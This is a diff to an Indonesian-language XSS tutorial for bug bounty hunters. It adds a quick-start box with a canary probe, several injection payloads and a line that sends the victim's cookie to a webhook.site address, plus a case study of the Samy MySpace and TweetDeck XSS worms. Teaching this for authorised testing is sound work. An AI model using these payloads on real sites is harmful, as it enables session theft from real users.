@@ -1,5 +1,16 @@
 # Cross-Site Scripting (XSS): Anatomi Serangan Nyata & Metodologi Bug Hunter
 
+> [!TIP]
+> ### ⚡ Cara Cepat / Quick Solution (Langsung Praktik)
+> 1. **Injeksi Canary:** Masukkan probe string unik pada input form: `test"'><h1>canary777`
+> 2. **Analisis Refleksi:** Tekan `Ctrl+U` / buka DevTools, cari `canary777`, amati karakter mana yang tidak di-filter.
+> 3. **Eksekusi Payload:**
+>    - Di dalam teks HTML: `<script>alert(document.domain)</script>`
+>    - Di dalam atribut tag: `"><svg onload=alert(1)>`
+>    - Eksfiltrasi cookie: `<script>fetch('https://webhook.site/xxx?c='+document.cookie)</script>`
+
+---
+
 Banyak pemula dalam dunia keamanan web sering bertanya: **"XSS itu kalau menyerang dampaknya seperti apa? Kan cuma menyisipkan JavaScript dan memunculkan pop-up `alert(1)`?"** serta **"Bagaimana cara bug hunter menemukan dan mendokumentasikan temuan XSS agar diterima (triaged) di program Bug Bounty?"**
 
 Pop-up `alert(1)` hanyalah pembuktian (*Proof of Concept*) bahwa peramban korban bersedia mengeksekusi skrip kita. Di dunia nyata, JavaScript yang berjalan di peramban korban memiliki **hak akses penuh (*Same-Origin Privileges*)** atas sesi akun korban di situs tersebut.
@@ -132,6 +143,14 @@ Periksa apakah karakter khusus kamu diubah menjadi entitas HTML:
 * Di dalam blok `<script>` → `"-alert(document.domain)-"`
 
 ---
+
+## 🌍 Studi Kasus Nyata di Industri (Real-World Case Study)
+
+### Samy Worm di MySpace (2005) & TweetDeck Retweet Worm (2014)
+Bukti nyata bahwa XSS adalah kerentanan berdaya hancur tinggi yang mampu melumpuhkan platform raksasa:
+* **Samy Worm di MySpace (2005):** Peneliti keamanan Samy Kamkar menemukan celah Stored XSS pada profil MySpace. Ia merancang kode JavaScript worm yang bekerja otomatis: setiap kali seseorang mengunjungi profil Samy, browser korban dipaksa menambahkan Samy sebagai teman, menuliskan teks *"Samy is my hero"* di profil korban, dan menyalin kode skrip tersebut ke profil korban sendiri.
+* **Penyebaran Eksponensial:** Hanya dalam **20 jam**, worm ini menginfeksi lebih dari **1.000.000 pengguna**, menjadikannya malware dengan penyebaran tercepat dalam sejarah internet dan memaksa MySpace mematikan seluruh layanannya secara darurat.
+* **TweetDeck XSS Worm (2014):** Celah XSS serupa pada TweetDeck mengeksekusi skrip yang memaksa akun pengguna me-retweet postingan XSS penyerang ribuan kali secara otomatis dalam hitungan menit.
 
 ## 4. Standar PoC & Format Laporan Bug Bounty Resmi
 
